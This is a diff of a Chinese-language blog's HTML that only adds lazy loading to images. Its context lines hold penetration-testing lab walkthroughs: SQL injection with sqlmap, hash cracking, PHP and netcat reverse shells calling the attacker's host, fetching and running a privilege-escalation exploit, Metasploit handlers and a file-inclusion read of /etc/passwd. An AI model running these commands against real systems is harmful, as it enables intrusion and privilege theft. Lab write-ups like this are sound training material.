-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-26.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-26.png"></p>
 <hr>
 <h2 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h2><p>使用 searchsploit 来搜索漏洞信息</p>
 <p>搜索所有 joomla 指定版本的漏洞信息，用法，中间添加一个空格就可以了。</p>
@@ -4482,21 +4467,21 @@
 <p>再精确，找到 joomla 3.7.0 版本的sql注入漏洞</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> joomla <span class="hljs-number">3</span>.<span class="hljs-number">7</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-27.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-27.png"></p>
 <p>我们可以利用<code>-p</code>选项，我们可以获得有关目标漏洞的更多信息，并将该漏洞的完整路径复制到剪切板上。</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> <span class="hljs-number">42033</span><br><span class="hljs-attribute">searchsploit</span> -p <span class="hljs-number">42033</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-28.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-28.png"></p>
 <p>我们查看这个内容</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<span class="hljs-regexp">/php/</span>webapps/<span class="hljs-number">42033</span>.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-29.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-29.png"></p>
 <hr>
 <h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>复制上面的payload，并把localhost本地地址替换成靶场地址，利用sqlmap工具</p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.234.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --current-user<br></code></pre></td></tr></table></figure>
 
 <p>这个时候就得到了数据库信息，并使用 <code>--current-user</code> 获取当前数据库用户，可以看到是root用户，以及看到数据库名</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-30.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-30.png"></p>
 <p>指定数据库为当前网站的数据库，枚举数据库所有表</p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.234.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables<br></code></pre></td></tr></table></figure>
 
@@ -4517,15 +4502,15 @@
 
 <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">john </span>--<span class="hljs-keyword">show </span>hash<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-31.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-31.png"></p>
 <p>得到 admin的密码<code>snoopy</code>，登录后台</p>
 <hr>
 <h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>添加一个php脚本，用于反弹shell</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-32.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-32.png"></p>
 <p>我们利用kali自带的webshell工具进行反弹</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/share/webshells/<br><br><span class="hljs-built_in">ls</span><br><br><span class="hljs-built_in">cd</span> php<br><br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-33.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-33.png"></p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> php-<span class="hljs-built_in">reverse</span>-<span class="hljs-keyword">shell</span>.php<br></code></pre></td></tr></table></figure>
 
 <p>修改一下这个文件的两个参数，然后全部复制到这个<code>script.php</code></p>
@@ -4541,7 +4526,7 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">234.132</span><span class="hljs-regexp">/templates/</span>beez3/script.php<br></code></pre></td></tr></table></figure>
 
 <p>成功上线</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-34.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-34.png"></p>
 <hr>
 <h2 id="创建交互式shell"><a href="#创建交互式shell" class="headerlink" title="创建交互式shell"></a>创建<strong>交互式shell</strong></h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
 
@@ -4550,11 +4535,11 @@
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h2><p>用到的命令</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-35.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-35.png"></p>
 <p>我们需要的是提权漏洞，再添加关键字 Privilege Escalation，找到这两个</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span> Privilege Escalation<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-36.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-36.png"></p>
 <hr>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h2><p>我们用第一个4.4.x的漏洞，进行尝试</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> -p <span class="hljs-number">39772</span><br></code></pre></td></tr></table></figure>
@@ -4572,7 +4557,7 @@
 
 <hr>
 <h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>解压，并开启http请求</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-37.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-37.png"></p>
 <p>复制这个文件的地址就好</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.234.128:8000</span>/<span class="hljs-number">39772</span>/exploit.tar<br></code></pre></td></tr></table></figure>
 
@@ -4583,7 +4568,7 @@
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;script.php&quot;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br><br>cd /<span class="hljs-keyword">var</span>/www/html/templates/beez3<br></code></pre></td></tr></table></figure>
 
 <p>我们在这个文件夹下面下载，下载完成</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-38.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-38.png"></p>
 <p>解压到这个文件夹中</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tar</span> -xvf exploit.tar<br></code></pre></td></tr></table></figure>
 
@@ -4592,7 +4577,7 @@
 
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ebpf_mapfd_doubleput_exploit<br>./compile.sh<br>./doubleput<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-39.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-39.png"></p>
 <p>提权成功</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br><br><span class="hljs-built_in">cat</span> /root/the-flag.txt<br></code></pre></td></tr></table></figure>
 
@@ -4604,24 +4589,24 @@
 <p>然后使用SYN隐蔽扫描指纹信息</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sSV <span class="hljs-number">192.168.234.133</span> -T5 -p-<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-40.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-40.png"></p>
 <p>目录扫描</p>
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirb http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.234.133/</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-41.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-41.png"></p>
 <p>访问80端口</p>
 <p>发现是一个登录界面，尝试万能密码</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --+<br><span class="hljs-attribute">12345</span><br></code></pre></td></tr></table></figure>
 
 <p>拦截之后再Repeater中发包看响应</p>
 <p>302跳转了</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-42.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-42.png"></p>
 <p>弱口令爆破出密码为happy</p>
 <p>点击Command随机选择一个选项，并抓包，修改payload，cat &#x2F;etc&#x2F;passwd，能够正常执行</p>
 <p>那么直接nc连接</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 攻击机<br>nc -lvvp <span class="hljs-number">1234</span><br><br><span class="hljs-regexp">//</span> 靶机<br>nc <span class="hljs-number">192.168</span>.<span class="hljs-number">234.128</span> <span class="hljs-number">1234</span> -e <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-43.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-43.png"></p>
 <p>创建交互式终端</p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
 
@@ -4629,7 +4614,7 @@
 <h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>SUID文件，有俩个可以利用，sudo和exim4命令提权</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-44.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-44.png"></p>
 <p>查看exim4版本信息，4.89 #2版本</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exim</span> --version<br><br><span class="hljs-comment">#</span><br><span class="hljs-attribute">4</span>.<span class="hljs-number">89</span> #<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
 
@@ -4650,16 +4635,16 @@
 <h2 id="EXP利用"><a href="#EXP利用" class="headerlink" title="EXP利用"></a><strong>EXP利用</strong></h2><p>找了一些信息，那么就可以开始分析了，先找<code>exim 4</code>漏洞，待会使用msf进行漏洞利用</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> exim <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-45.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-45.png"></p>
 <p>选择这个4.87 - 4.91的提权漏洞</p>
 <p>切换到exp位置，并使用py开启http服务</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> -p <span class="hljs-number">46996</span>.sh<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-46.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-46.png"></p>
 <p>从攻击机器下载文件，<strong>并赋予执行权限</strong></p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">//</span> 注意要先切到有写入文件权限的目录，一般都是<span class="hljs-string">/tmp</span><br><span class="hljs-keyword">cd</span> <span class="hljs-string">/tmp</span><br><br><span class="hljs-string">//</span> 下载文件<br>wget http:<span class="hljs-string">//192.168.234.128</span><span class="hljs-function">:8888</span>/46996.sh<br><br><span class="hljs-string">//</span> 赋予执行权限<br>chmod +x 46996.sh<br><br><span class="hljs-string">//</span> 执行<br><span class="hljs-string">./46996.sh</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-47.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-47.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/flag.txt<br></code></pre></td></tr></table></figure>
 
 <p>利用成功</p>
@@ -4667,18 +4652,18 @@
 <h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a><strong>MSF</strong></h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br><span class="hljs-attribute">search exim</span><br></code></pre></td></tr></table></figure>
 
 <p>从图中可以看到，该版本制造在2018年的2月10日</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-48.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-48.png"></p>
 <figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">use</span> <span class="hljs-number">1</span><br><br><span class="hljs-comment">// 显示配置项</span><br><span class="hljs-keyword">show</span> options<br></code></pre></td></tr></table></figure>
 
 <p>显示它的配置项，他需要一个session会话</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-49.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-49.png"></p>
 <h2 id="exploit-multi-handler"><a href="#exploit-multi-handler" class="headerlink" title="exploit&#x2F;multi&#x2F;handler"></a>exploit&#x2F;multi&#x2F;handler</h2><p>&#x2F;&#x2F; exploit&#x2F;multi&#x2F;handler 是 Metasploit 中用于接收反弹连接的通用监听模块。</p>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><br><br><span class="hljs-keyword">options</span><br><br><span class="hljs-keyword">set</span> lhost <span class="hljs-comment">192.168.234.128</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload linux</span>/x86/<span class="hljs-comment">shell_reverse_tcp</span><br><br>run<br></code></pre></td></tr></table></figure>
 
 <p>然后在靶机上</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.234.128</span> <span class="hljs-number">4444</span> -e /bin/sh<br></code></pre></td></tr></table></figure>
 
-<p>反弹成功<img src="C:/Users/Administrator/myBlog/source/image/ISW-50.png"></p>
+<p>反弹成功<img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-50.png"></p>
 <p>结束掉这个会话，重新反弹，使用run -j 将会话保存到后台，这样就能获得会话sessions了</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">结束会话按ctrl+z<br><br>或者：sessions -k 1<br></code></pre></td></tr></table></figure>
 
@@ -4696,7 +4681,7 @@
 <hr>
 <h2 id="全端口扫描，并使用-T参数加快速度"><a href="#全端口扫描，并使用-T参数加快速度" class="headerlink" title="全端口扫描，并使用-T参数加快速度"></a>全端口扫描，并使用-T参数加快速度</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sS <span class="hljs-number">192.168.234.134</span> -p- -T5<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-51.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-51.png"></p>
 <p>打开首页</p>
 <p>dirb目录扫描</p>
 <p>切换到contact界面，抓包</p>
@@ -4704,16 +4689,16 @@
 <p>然后发现sql注入不存在</p>
 <p>xss测试，也不存在</p>
 <p>再搜集其他信息，也没看到什么</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-52.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-52.png"></p>
 <p>再使用dirsearch 搜索，看到一个footer.php文件</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-54.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-54.png"></p>
 <p>访问一下</p>
 <p>再刷新一下，意外的发现了数据会变</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-53.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-53.png"></p>
 <p>然后再看看thankyou.php</p>
 <p>页眉也是跟footer.php一样会随机变化。</p>
 <p>这时候就可以判断，这个表单提交成功的页面，可能存在文件包含漏洞，包含<code>index.php</code>试试</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-55.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-55.png"></p>
 <p>包含<code>/etc/passwd</code></p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span> <span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span><span class="hljs-symbol">:/var/list</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span> systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Time</span> <span class="hljs-title class_">Synchronization</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span>,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Resolver</span>,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span> systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Bus</span> <span class="hljs-title class_">Proxy</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-title class_">Debian</span>-<span class="hljs-symbol">exim:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/exim4</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/dbus</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">statd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/nfs</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span 